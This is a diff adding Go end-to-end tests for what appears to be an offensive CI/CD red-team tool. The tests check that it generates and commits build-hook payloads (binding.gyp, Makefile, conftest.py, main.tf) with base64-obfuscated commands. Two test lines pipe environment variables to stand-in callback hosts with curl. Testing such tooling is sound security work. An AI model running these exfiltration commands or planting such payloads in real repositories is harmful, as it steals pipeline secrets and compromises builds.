@@ -776,3 +776,216 @@ func TestAttack_CleanupPipeline(t *testing.T) {
 		t.Fatalf("unmarshal: %v\nraw: %s", err, stdout)
 	}
 }
+
+// ----- LOTP payload-only tests (no credentials needed) -----
+
+func TestAttack_PayloadOnly_LOTP_GYP(t *testing.T) {
+	// Phantom Gyp technique: binding.gyp + index.js
+	stdout, stderr, err := runGogatoz(t, "", "attack",
+		"--payload-only", "--payload", "lotp-gyp",
+		"--cmd", "printenv | curl -sd @- https://cb.example.com",
+	)
+	if err != nil {
+		t.Fatalf("payload-only lotp-gyp failed: %v\nstderr: %s", err, stderr)
+	}
+	var out map[string]any
+	if err := json.Unmarshal([]byte(stdout), &out); err != nil {
+		t.Fatalf("lotp-gyp output is not valid JSON: %v\nraw: %s", err, stdout)
+	}
+	if out["tool"] != "npm-gyp" {
+		t.Errorf("tool=%v want npm-gyp", out["tool"])
+	}
+	files, _ := out["files"].([]any)
+	if len(files) != 2 {
+		t.Fatalf("expected 2 files (binding.gyp + index.js), got %d", len(files))
+	}
+	paths := make(map[string]string)
+	for _, f := range files {
+		fm := f.(map[string]any)
+		paths[fm["path"].(string)] = fm["content"].(string)
+	}
+	if _, ok := paths["binding.gyp"]; !ok {
+		t.Error("expected binding.gyp in output files")
+	}
+	if _, ok := paths["index.js"]; !ok {
+		t.Error("expected index.js in output files")
+	}
+	if !strings.Contains(paths["binding.gyp"], "<!(node index.js") {
+		t.Error("binding.gyp should contain gyp command substitution")
+	}
+	// Command must be base64-encoded in index.js (not plaintext)
+	if strings.Contains(paths["index.js"], "printenv") {
+		t.Error("index.js must not contain the plaintext command — should be base64-encoded")
+	}
+	if !strings.Contains(paths["index.js"], "Buffer.from") {
+		t.Error("index.js should decode base64 via Buffer.from")
+	}
+}
+
+func TestAttack_PayloadOnly_LOTP_Make(t *testing.T) {
+	stdout, stderr, err := runGogatoz(t, "", "attack",
+		"--payload-only", "--payload", "lotp-make",
+		"--cmd", "id",
+	)
+	if err != nil {
+		t.Fatalf("payload-only lotp-make failed: %v\nstderr: %s", err, stderr)
+	}
+	var out map[string]any
+	if err := json.Unmarshal([]byte(stdout), &out); err != nil {
+		t.Fatalf("lotp-make output is not valid JSON: %v\nraw: %s", err, stdout)
+	}
+	files, _ := out["files"].([]any)
+	if len(files) != 1 {
+		t.Fatalf("expected 1 file (Makefile), got %d", len(files))
+	}
+	fm := files[0].(map[string]any)
+	if fm["path"] != "Makefile" {
+		t.Errorf("path=%v want Makefile", fm["path"])
+	}
+	if !strings.Contains(fm["content"].(string), "$(shell") {
+		t.Error("Makefile should use $(shell ...) expansion")
+	}
+}
+
+func TestAttack_PayloadOnly_LOTP_Pytest(t *testing.T) {
+	stdout, stderr, err := runGogatoz(t, "", "attack",
+		"--payload-only", "--payload", "lotp-pytest",
+		"--cmd", "whoami",
+	)
+	if err != nil {
+		t.Fatalf("payload-only lotp-pytest failed: %v\nstderr: %s", err, stderr)
+	}
+	var out map[string]any
+	if err := json.Unmarshal([]byte(stdout), &out); err != nil {
+		t.Fatalf("lotp-pytest output is not valid JSON: %v\nraw: %s", err, stdout)
+	}
+	files, _ := out["files"].([]any)
+	if len(files) != 1 {
+		t.Fatalf("expected 1 file (conftest.py), got %d", len(files))
+	}
+	fm := files[0].(map[string]any)
+	if fm["path"] != "conftest.py" {
+		t.Errorf("path=%v want conftest.py", fm["path"])
+	}
+}
+
+func TestAttack_PayloadOnly_LOTP_Terraform(t *testing.T) {
+	stdout, stderr, err := runGogatoz(t, "", "attack",
+		"--payload-only", "--payload", "lotp-terraform",
+		"--cmd", "env | curl -sd @- https://callback.example.com",
+	)
+	if err != nil {
+		t.Fatalf("payload-only lotp-terraform failed: %v\nstderr: %s", err, stderr)
+	}
+	var out map[string]any
+	if err := json.Unmarshal([]byte(stdout), &out); err != nil {
+		t.Fatalf("lotp-terraform output is not valid JSON: %v\nraw: %s", err, stdout)
+	}
+	files, _ := out["files"].([]any)
+	if len(files) != 1 {
+		t.Fatalf("expected 1 file (main.tf), got %d", len(files))
+	}
+	if files[0].(map[string]any)["path"] != "main.tf" {
+		t.Error("expected main.tf")
+	}
+}
+
+// ----- LOTP inject tests (require credentials + target) -----
+
+func TestAttack_LOTPInject_GYP(t *testing.T) {
+	tok := requireCreds(t)
+	branch := e2eBranchName(t)
+
+	t.Cleanup(func() {
+		runGogatozWithTimeout(t, tok, 30*time.Second,
+			"attack", "--target", vulnLOTPGYP,
+			"--cleanup", "--cleanup-branch", branch)
+	})
+
+	stdout, stderr, err := runGogatoz(t, tok,
+		"attack", "--target", vulnLOTPGYP,
+		"--lotp-inject", "--lotp-tool", "npm-gyp",
+		"--cmd", "printenv | head -5",
+		"--branch", branch,
+		"--deconflict", "fail",
+		"--json",
+	)
+	skipOnInsufficientScope(t, err, stderr)
+	if err != nil {
+		t.Fatalf("lotp-inject gyp failed: %v\nstderr: %s", err, stderr)
+	}
+
+	var result map[string]any
+	if err := json.Unmarshal([]byte(stdout), &result); err != nil {
+		t.Fatalf("unmarshal: %v\nraw: %s", err, stdout)
+	}
+	if result["branch"].(string) == "" {
+		t.Error("expected non-empty branch in output")
+	}
+	if result["tool"] != "npm-gyp" {
+		t.Errorf("tool=%v want npm-gyp", result["tool"])
+	}
+	files, _ := result["files_committed"].([]any)
+	if len(files) != 2 {
+		t.Errorf("expected 2 committed files (binding.gyp + index.js), got %d", len(files))
+	}
+}
+
+func TestAttack_LOTPInject_Make(t *testing.T) {
+	tok := requireCreds(t)
+	branch := e2eBranchName(t)
+
+	t.Cleanup(func() {
+		runGogatozWithTimeout(t, tok, 30*time.Second,
+			"attack", "--target", vulnLOTPNpm,
+			"--cleanup", "--cleanup-branch", branch)
+	})
+
+	stdout, stderr, err := runGogatoz(t, tok,
+		"attack", "--target", vulnLOTPNpm,
+		"--lotp-inject", "--lotp-tool", "make",
+		"--cmd", "id",
+		"--branch", branch,
+		"--deconflict", "fail",
+		"--json",
+	)
+	skipOnInsufficientScope(t, err, stderr)
+	if err != nil {
+		t.Fatalf("lotp-inject make failed: %v\nstderr: %s", err, stderr)
+	}
+
+	var result map[string]any
+	if err := json.Unmarshal([]byte(stdout), &result); err != nil {
+		t.Fatalf("unmarshal: %v\nraw: %s", err, stdout)
+	}
+	if b, ok := result["branch"].(string); !ok || b == "" {
+		t.Error("expected non-empty branch")
+	}
+	files, _ := result["files_committed"].([]any)
+	if len(files) != 1 {
+		t.Errorf("expected 1 committed file (Makefile), got %d", len(files))
+	}
+}
+
+func TestAttack_PayloadOnly_LOTP_MissingCmd(t *testing.T) {
+	_, _, err := runGogatoz(t, "", "attack",
+		"--payload-only", "--payload", "lotp-gyp",
+		// no --cmd
+	)
+	if err == nil {
+		t.Fatal("expected error when --cmd is missing for LOTP payload")
+	}
+}
+
+func TestAttack_LOTPInject_MissingTool(t *testing.T) {
+	tok := requireCreds(t)
+	_, _, err := runGogatoz(t, tok,
+		"attack", "--target", vulnLOTPNpm,
+		"--lotp-inject",
+		"--cmd", "id",
+		// no --lotp-tool
+	)
+	if err == nil {
+		t.Fatal("expected error when --lotp-tool is missing for --lotp-inject")
+	}
+}
